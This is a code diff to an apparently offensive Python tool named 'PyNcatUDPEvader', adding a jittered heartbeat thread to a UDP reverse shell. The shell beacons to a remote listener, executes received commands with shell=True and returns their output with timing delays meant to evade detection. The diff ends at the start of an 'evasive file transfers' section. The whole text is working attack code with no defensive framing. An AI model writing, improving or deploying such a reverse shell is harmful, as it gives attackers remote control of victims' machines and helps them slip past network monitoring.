@@ -245,50 +245,87 @@ class PyNcatUDPEvader:
                 
                 # STRATEGY A: AUTOMATED REVERSE SHELL SUBPROCESS BROKER
                 if self.args.execute:
-                    # Force a socket response timeout check so the client knows if the server dropped
-                    client.settimeout(30)
+                    # Enforce a strict socket timeout threshold to trigger error processing if communication drops
+                    client.settimeout(45)
                     
+                    # Track last interaction timestamp to prevent sending overlapping telemetry bursts
+                    last_activity = [time.time()]
+                    heartbeat_running = threading.Event()
+                    heartbeat_running.set()
+
+                    def heartbeat_worker():
+                        """Pushes customized, non-deterministic keepalive telemetry frames."""
+                        while heartbeat_running.is_set():
+                            try:
+                                current_time = time.time()
+                                # Check if the application has been idle longer than the heartbeat window
+                                if current_time - last_activity[0] >= self.args.heartbeat:
+                                    logging.debug("[*] Telemetry threshold reached. Dispatching heartbeat pulse...")
+                                    # Send an empty marker byte series that the listener drops cleanly
+                                    client.sendto(self._pack_and_secure(b"__PING__"), target_destination)
+                                    last_activity[0] = current_time
+                                
+                                # Inject timing jitter into the background daemon polling interval
+                                self._apply_sleep(self.args.heartbeat * 0.25)
+                            except Exception:
+                                break
+
+                    # Launch the heartbeat thread as a daemon so it dies if the main thread terminates
+                    threading.Thread(target=heartbeat_worker, daemon=True).start()
+
                     # Core initialization beacon to establish connection on the server
                     beacon_payload = self._pack_and_secure(b"[+] Reverse Shell Node Active. Send commands.")
                     client.sendto(beacon_payload, target_destination)
                     
-                    while True:
-                        try:
-                            raw_packet, addr = client.recvfrom(65507)
-                            instruction_bytes = self._unpack_and_verify(raw_packet)
-                            cmd = instruction_bytes.decode('utf-8', errors='replace').strip()
-                            
-                            if not cmd:
-                                continue
-                            if cmd.lower() in ['exit', 'quit']:
-                                logging.info("[!] Explicit exit instruction received. Terminating broker execution.")
-                                return
-                                
-                            # Subprocess Execution Logic
+                    try:
+                        while True:
                             try:
-                                proc = subprocess.Popen(
-                                    cmd, shell=True, 
-                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
-                                )
-                                stdout, stderr = proc.communicate(timeout=15)
-                                response = stdout + stderr
-                                if not response:
-                                    response = b"[+] Command executed with no terminal output returned.\n"
-                            except subprocess.TimeoutExpired:
-                                proc.kill()
-                                response = b"[-] Command execution process timed out.\n"
-                            except Exception as sub_err:
-                                response = f"[-] Subprocess Routing Fault: {sub_err}\n".encode()
-                            
-                            # Apply Timing Delay + Jitter before transmitting the output
-                            self._apply_sleep(self.args.delay)
-                            client.sendto(self._pack_and_secure(response), target_destination)
-                            
-                        except socket.timeout:
-                            # Re-transmit beacon if listener context goes silent
-                            logging.debug("[-] Network timeout reached. Re-transmitting active registration beacon...")
-                            client.sendto(self._pack_and_secure(b"[+] Keeping connection alive..."), target_destination)
+                                raw_packet, addr = client.recvfrom(65507)
+                                last_activity[0] = time.time()  # Reset heartbeat tracker immediately upon packet reception
+                                
+                                instruction_bytes = self._unpack_and_verify(raw_packet)
+                                
+                                # Cleanly ignore heartbeat echo confirmations from the listener
+                                if instruction_bytes == b"__PONG__":
+                                    continue
+                                    
+                                cmd = instruction_bytes.decode('utf-8', errors='replace').strip()
+                                
+                                if not cmd:
+                                    continue
+                                if cmd.lower() in ['exit', 'quit']:
+                                    logging.info("[!] Explicit exit instruction received. Terminating broker execution.")
+                                    heartbeat_running.clear()
+                                    return
+                                    
+                                # Subprocess Execution Logic
+                                try:
+                                    proc = subprocess.Popen(
+                                        cmd, shell=True, 
+                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+                                    )
+                                    stdout, stderr = proc.communicate(timeout=15)
+                                    response = stdout + stderr
+                                    if not response:
+                                        response = b"[+] Command executed with no terminal output returned.\n"
+                                except subprocess.TimeoutExpired:
+                                    proc.kill()
+                                    response = b"[-] Command execution process timed out.\n"
+                                except Exception as sub_err:
+                                    response = f"[-] Subprocess Routing Fault: {sub_err}\n".encode()
+                                
+                                # Apply Timing Delay + Jitter before transmitting the output
+                                self._apply_sleep(self.args.delay)
+                                client.sendto(self._pack_and_secure(response), target_destination)
+                                last_activity[0] = time.time()
+                                
+                            except socket.timeout:
+                                logging.warning("[-] Core socket timeout reached without traffic. Forcing session tear-down and rebuild.")
+                                break  # Break inner loop to trigger outer socket reconnection logic
+                    finally:
+                        heartbeat_running.clear()  # Ensure the thread halts when reloading the loop context
                     return
+
 
                 # STRATEGY B: EVASIVE FILE TRANSFERS
                 if self.args.file and os.path.exists(self.args.file):
